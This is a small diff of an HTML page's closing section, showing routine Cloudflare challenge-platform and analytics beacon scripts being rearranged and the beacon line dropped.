   <script type="e4587ea736eb1659062f36b5-text/javascript">
@@ -3837,6 +3894,5 @@ window.onload = function() {
   </script>
 <footer class="sections" id="footer-sections" data-footer-sections>
 </footer>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'96a8912dfdd7a2c5',t:'MTc1NDQyMDczOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"0302372ca7a04c538b3cee1ce8806ee0","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-</body>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'96a8912dfdd7a2c5',t:'MTc1NDQyMDczOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
